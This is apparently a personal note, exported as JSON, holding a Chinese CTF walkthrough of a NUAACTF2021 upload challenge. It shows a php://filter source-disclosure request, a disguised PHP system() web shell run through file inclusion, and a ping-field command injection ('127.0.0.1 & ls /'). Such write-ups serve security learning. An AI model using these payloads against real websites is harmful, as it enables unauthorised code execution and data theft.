{"ID":"20241008125059-sla32ec","Spec":"1","Type":"NodeDocument","Properties":{"id":"20241008125059-sla32ec","title":"upload-NUAACTF2021","updated":"20241008133722"},"Children":[{"ID":"20241008125059-7mtn9o1","Type":"NodeParagraph","Properties":{"id":"20241008125059-7mtn9o1","updated":"20241008132807"},"Children":[{"Type":"NodeTextMark","TextMarkType":"a","TextMarkAHref":"https://ctf.bugku.com/challenges/detail/id/1063.html","TextMarkTextContent":"upload+文件包含+一句话木马"}]},{"ID":"20241008125158-uzsmxrz","Type":"NodeParagraph","Properties":{"id":"20241008125158-uzsmxrz","updated":"20241008125257"},"Children":[{"Type":"NodeText","Data":"文件上传"}]},{"ID":"20241008125304-4nazx4m","Type":"NodeParagraph","Properties":{"id":"20241008125304-4nazx4m","updated":"20241008125304"},"Children":[{"Type":"NodeText","Data":"​"},{"Type":"NodeImage","Data":"span","Children":[{"Type":"NodeBang"},{"Type":"NodeOpenBracket"},{"Type":"NodeLinkText","Data":"image"},{"Type":"NodeCloseBracket"},{"Type":"NodeOpenParen"},{"Type":"NodeLinkDest","Data":"assets/image-20241008125304-57mmicc.png"},{"Type":"NodeCloseParen"}]},{"Type":"NodeText","Data":"​"}]},{"ID":"20241008125308-rvup3o8","Type":"NodeParagraph","Properties":{"id":"20241008125308-rvup3o8","updated":"20241008125408"},"Children":[{"Type":"NodeText","Data":"F12查看"},{"Type":"NodeTextMark","TextMarkType":"code","TextMarkTextContent":"read.php?filename="},{"Type":"NodeText","Data":"​   --\u003e考虑到结合伪协议读取源码"}]},{"ID":"20241008125325-wehrko9","Type":"NodeParagraph","Properties":{"id":"20241008125325-wehrko9","updated":"20241008125325"},"Children":[{"Type":"NodeText","Data":"​"},{"Type":"NodeImage","Data":"span","Children":[{"Type":"NodeBang"},{"Type":"NodeOpenBracket"},{"Type":"NodeLinkText","Data":"image"},{"Type":"NodeCloseBracket"},{"Type":"NodeOpenParen"},{"Type":"NodeLinkDest","Data":"assets/image-20241008125325-6bwpf91.png"},{"Type":"NodeCloseParen"}]},{"Type":"NodeText","Data":"​"}]},{"ID":"20241008125420-hjyyv49","Type":"NodeParagraph","Properties":{"id":"20241008125420-hjyyv49"}},{"ID":"20241008125421-xc8evyi","Type":"NodeParagraph","Properties":{"id":"20241008125421-xc8evyi","updated":"20241008125421"},"Children":[{"Type":"NodeText","Data":"​"},{"Type":"NodeTextMark","TextMarkType":"code","TextMarkTextContent":"/read.php?filename=php://filter/convert.base64-encode/resource=index.php"},{"Type":"NodeText","Data":"​"}]},{"ID":"20241008125435-kdoa75m","Type":"NodeParagraph","Properties":{"id":"20241008125435-kdoa75m","updated":"20241008125435"},"Children":[{"Type":"NodeText","Data":"​"},{"Type":"NodeImage","Data":"span","Children":[{"Type":"NodeBang"},{"Type":"NodeOpenBracket"},{"Type":"NodeLinkText","Data":"image"},{"Type":"NodeCloseBracket"},{"Type":"NodeOpenParen"},{"Type":"NodeLinkDest","Data":"assets/image-20241008125435-9ean74r.png"},{"Type":"NodeCloseParen"}]},{"Type":"NodeText","Data":"​"}]},{"ID":"20241008125436-zd3l07z","Type":"NodeParagraph","Properties":{"id":"20241008125436-zd3l07z","updated":"20241008125441"},"Children":[{"Type":"NodeText","Data":"base64解码"}]},{"ID":"20241008125444-ywu4j6p","Type":"NodeCodeBlock","IsFencedCodeBlock":true,"Properties":{"id":"20241008125444-ywu4j6p","updated":"20241008131006"},"Children":[{"Type":"NodeCodeBlockFenceOpenMarker","Data":"```"},{"Type":"NodeCodeBlockFenceInfoMarker","CodeBlockInfo":"cHl0aG9u"},{"Type":"NodeCodeBlockCode","Data":"\u003cdiv class=\"light\"\u003e\u003cspan class=\"glow\"\u003e\n\t\t\t\u003cform enctype=\"multipart/form-data\" method=\"post\" onsubmit=\"return checkFile()\"\u003e\n\t\t\t\t嘿伙计，传个火？！\n                \u003cinput class=\"input_file\" type=\"file\" name=\"upload_file\"/\u003e\n                \u003cinput class=\"button\" type=\"submit\" name=\"submit\" value=\"upload\"/\u003e\n            \u003c/form\u003e\n      \u003c/span\u003e\u003cspan class=\"flare\"\u003e\u003c/span\u003e\u003cdiv\u003e\n\t  \u003c!--read.php?filename=  --\u003e\n\u003c?php\n\terror_reporting(0);\n\t//设置上传目录\n\tdefine(\"UPLOAD_PATH\", \"./uplo4d\");    //文件上传路径\n\t$msg = \"Upload Success!\";\n\tif (isset($_POST['submit'])) {\n        $temp_file = $_FILES['upload_file']['tmp_name']; //临时存储文件名\n        $file_name = $_FILES['upload_file']['name'];     //原始文件名\n        $ext = pathinfo($file_name,PATHINFO_EXTENSION); //通过pathinfo()获取文件扩展名$ext\n      if(preg_match(\"/ph/i\", strtolower($ext))){        //检查扩展名是否包含“ph”，如果是，则终止脚本执行，防止上传PHP文件。\n        die(\"这可不能上传啊！\");\n    }\n   \n            $content = file_get_contents($temp_file);  //文件内容不能有php，使用这个\u003c?=?\u003e\n            if(preg_match(\"/php/i\", $content)){\n                die(\"诶，被我发现了吧\");\n            }\n\n        $new_file_name = md5($file_name).\".\".$ext;  //md5()对文件名进行哈希处理，并加上原始扩展名，以避免文件名冲突\n        $img_path = UPLOAD_PATH . '/' . $new_file_name; //指定新文件路径$img_path\n\n\n        if (move_uploaded_file($temp_file, $img_path)){  //move_uploaded_file()尝试移动文件到新路径，如果成功，则设置$is_upload为true\n            $is_upload = true;\n        } else {\n            $msg = 'Upload Failed!';\n        }\n        echo '\u003cdiv style=\"color:#F00\"\u003e'.$msg.\" Look here~ \".$img_path.\"\u003c/div\u003e\";\n    }\n\n\n?\u003e\n"},{"Type":"NodeCodeBlockFenceCloseMarker","Data":"```"}]},{"ID":"20241008130730-pf46242","Type":"NodeParagraph","Properties":{"id":"20241008130730-pf46242","updated":"20241008130731"},"Children":[{"Type":"NodeText","Data":"http://82.157.146.43:10532/read.php?filename=php://filter/convert.base64-encode/resource=read.php"}]},{"ID":"20241008130741-6eww73k","Type":"NodeParagraph","Properties":{"id":"20241008130741-6eww73k","updated":"20241008130741"},"Children":[{"Type":"NodeText","Data":"​"},{"Type":"NodeImage","Data":"span","Children":[{"Type":"NodeBang"},{"Type":"NodeOpenBracket"},{"Type":"NodeLinkText","Data":"image"},{"Type":"NodeCloseBracket"},{"Type":"NodeOpenParen"},{"Type":"NodeLinkDest","Data":"assets/image-20241008130741-oia9rhu.png"},{"Type":"NodeCloseParen"}]},{"Type":"NodeText","Data":"​"}]},{"ID":"20241008130743-rb72lvf","Type":"NodeCodeBlock","IsFencedCodeBlock":true,"Properties":{"id":"20241008130743-rb72lvf","updated":"20241008130826"},"Children":[{"Type":"NodeCodeBlockFenceOpenMarker","Data":"```"},{"Type":"NodeCodeBlockFenceInfoMarker","CodeBlockInfo":"cHl0aG9u"},{"Type":"NodeCodeBlockCode","Data":"//include文件包含，过滤flag关键字\n\u003c?php\nerror_reporting(0);\n$a=$_GET[\"filename\"];\nif(preg_match('/flag/i',$a)){\n  exit(\"nononono\");\n}\ninclude($a);\n\n?\u003e\n\n"},{"Type":"NodeCodeBlockFenceCloseMarker","Data":"```"}]},{"ID":"20241008131026-zry2im0","Type":"NodeParagraph","Properties":{"id":"20241008131026-zry2im0"}},{"ID":"20241008131027-bj5wesi","Type":"NodeParagraph","Properties":{"id":"20241008131027-bj5wesi"}},{"ID":"20241008131028-3j1nwbn","Type":"NodeCodeBlock","IsFencedCodeBlock":true,"Properties":{"id":"20241008131028-3j1nwbn","updated":"20241008132823"},"Children":[{"Type":"NodeCodeBlockFenceOpenMarker","Data":"```"},{"Type":"NodeCodeBlockFenceInfoMarker","CodeBlockInfo":"cHl0aG9u"},{"Type":"NodeCodeBlockCode","Data":"\u003c?= system(\"ls /\"); ?\u003e\t//根目录下存在flag文件\n\u003c?= system(\"cat /flag\"); ?\u003e\t//四个问号代表四个字符(flag)，提示flag在环境变量中\n\u003c?= system(\"env\"); ?\u003e\t//获取flag\n"},{"Type":"NodeCodeBlockFenceCloseMarker","Data":"```"}]},{"ID":"20241008132459-cj50rcj","Type":"NodeParagraph","Properties":{"id":"20241008132459-cj50rcj","updated":"20241008132501"},"Children":[{"Type":"NodeText","Data":"http://82.157.146.43:10532/read.php?filename=./uplo4d/fb5c81ed3a220004b71069645f112867.png"}]},{"ID":"20241008132411-j2dgbh1","Type":"NodeParagraph","Properties":{"id":"20241008132411-j2dgbh1","updated":"20241008132411"},"Children":[{"Type":"NodeText","Data":"​"},{"Type":"NodeImage","Data":"span","Children":[{"Type":"NodeBang"},{"Type":"NodeOpenBracket"},{"Type":"NodeLinkText","Data":"image"},{"Type":"NodeCloseBracket"},{"Type":"NodeOpenParen"},{"Type":"NodeLinkDest","Data":"assets/image-20241008132411-v3madcf.png"},{"Type":"NodeCloseParen"}]},{"Type":"NodeText","Data":"​"}]},{"ID":"20241008132436-7ok8s2b","Type":"NodeParagraph","Properties":{"id":"20241008132436-7ok8s2b","updated":"20241008132441"},"Children":[{"Type":"NodeText","Data":"cat /flag"}]},{"ID":"20241008132524-12m68el","Type":"NodeParagraph","Properties":{"id":"20241008132524-12m68el","updated":"20241008132525"},"Children":[{"Type":"NodeText","Data":"flag位于环境变量中-来自一位要求不要成为nam的战士"}]},{"ID":"20241008132443-3ob3jrc","Type":"NodeParagraph","Properties":{"id":"20241008132443-3ob3jrc","updated":"20241008132443"},"Children":[{"Type":"NodeText","Data":"​"},{"Type":"NodeImage","Data":"span","Children":[{"Type":"NodeBang"},{"Type":"NodeOpenBracket"},{"Type":"NodeLinkText","Data":"image"},{"Type":"NodeCloseBracket"},{"Type":"NodeOpenParen"},{"Type":"NodeLinkDest","Data":"assets/image-20241008132443-v012zmr.png"},{"Type":"NodeCloseParen"}]},{"Type":"NodeText","Data":"​"}]},{"ID":"20241008132636-3bviw16","Type":"NodeParagraph","Properties":{"id":"20241008132636-3bviw16","updated":"20241008132700"},"Children":[{"Type":"NodeText","Data":"​"},{"Type":"NodeTextMark","TextMarkType":"code","TextMarkTextContent":"\u0026quot;env\u0026quot;"},{"Type":"NodeText","Data":"​ 命令：这是Unix/Linux系统中一个用来列出所有环境变量的命令。当这个命令被执行时，它会输出当前shell环境中的所有环境变量"},{"Type":"NodeTextMark","Properties":{"style":"background-color: var(--b3-font-background2);"},"TextMarkType":"text","TextMarkTextContent":"及其值"},{"Type":"NodeKramdownSpanIAL","Data":"{: style=\"background-color: var(--b3-font-background2);\"}"},{"Type":"NodeText","Data":"。"}]},{"ID":"20241008132852-90l1ck3","Type":"NodeParagraph","Properties":{"id":"20241008132852-90l1ck3","updated":"20241008132852"},"Children":[{"Type":"NodeText","Data":"​"},{"Type":"NodeImage","Data":"span","Children":[{"Type":"NodeBang"},{"Type":"NodeOpenBracket"},{"Type":"NodeLinkText","Data":"image"},{"Type":"NodeCloseBracket"},{"Type":"NodeOpenParen"},{"Type":"NodeLinkDest","Data":"assets/image-20241008132852-7jfv32r.png"},{"Type":"NodeCloseParen"}]},{"Type":"NodeText","Data":"​"}]},{"ID":"20241008132856-tj857pb","Type":"NodeParagraph","Properties":{"id":"20241008132856-tj857pb","updated":"20241008132856"},"Children":[{"Type":"NodeText","Data":"FLAG=0xGame{upl0ad_f1le_causes_danger!!!}"}]},{"ID":"20241008133031-jg9nq2n","Type":"NodeParagraph","Properties":{"id":"20241008133031-jg9nq2n"}},{"ID":"20241008133048-6d9qyb8","Type":"NodeHeading","HeadingLevel":4,"Properties":{"id":"20241008133048-6d9qyb8","updated":"20241008133048"},"Children":[{"Type":"NodeTextMark","TextMarkType":"a","TextMarkTextContent":"command"}]},{"ID":"20241008133103-v0i86fg","Type":"NodeParagraph","Properties":{"id":"20241008133103-v0i86fg","updated":"20241008133103"},"Children":[{"Type":"NodeText","Data":"​"},{"Type":"NodeImage","Data":"span","Children":[{"Type":"NodeBang"},{"Type":"NodeOpenBracket"},{"Type":"NodeLinkText","Data":"image"},{"Type":"NodeCloseBracket"},{"Type":"NodeOpenParen"},{"Type":"NodeLinkDest","Data":"assets/image-20241008133103-4b6jvgg.png"},{"Type":"NodeCloseParen"}]},{"Type":"NodeText","Data":"​"}]},{"ID":"20241008133105-47zjc28","Type":"NodeParagraph","Properties":{"id":"20241008133105-47zjc28","updated":"20241008133131"},"Children":[{"Type":"NodeText","Data":"源代码查看ping按钮有disable属性--前端删除"}]},{"ID":"20241008133033-cuxfy9i","Type":"NodeParagraph","Properties":{"id":"20241008133033-cuxfy9i","updated":"20241008133140"},"Children":[{"Type":"NodeText","Data":"ping百度不回显"}]},{"ID":"20241008133145-14gvemu","Type":"NodeParagraph","Properties":{"id":"20241008133145-14gvemu","updated":"20241008133211"},"Children":[{"Type":"NodeText","Data":"结合符号|\u0026"}]},{"ID":"20241008133328-bnec4ic","Type":"NodeParagraph","Properties":{"id":"20241008133328-bnec4ic","updated":"20241008133620"},"Children":[{"Type":"NodeText","Data":"127.0.0.1 \u0026 ls /"}]},{"ID":"20241008133418-6bxxgh9","Type":"NodeParagraph","Properties":{"id":"20241008133418-6bxxgh9","updated":"20241008133648"},"Children":[{"Type":"NodeText","Data":"​​"},{"Type":"NodeImage","Data":"span","Children":[{"Type":"NodeBang"},{"Type":"NodeOpenBracket"},{"Type":"NodeLinkText","Data":"image"},{"Type":"NodeCloseBracket"},{"Type":"NodeOpenParen"},{"Type":"NodeLinkDest","Data":"assets/image-20241008133648-uwcylvl.png"},{"Type":"NodeCloseParen"}]},{"Type":"NodeText","Data":"​​"}]},{"ID":"20241008133344-8lqeozb","Type":"NodeParagraph","Properties":{"id":"20241008133344-8lqeozb","updated":"20241008133722"},"Children":[{"Type":"NodeText","Data":"127.0.0.1 \u0026 ls /flag"}]},{"ID":"20241008133508-24hxjyw","Type":"NodeParagraph","Properties":{"id":"20241008133508-24hxjyw"}}]}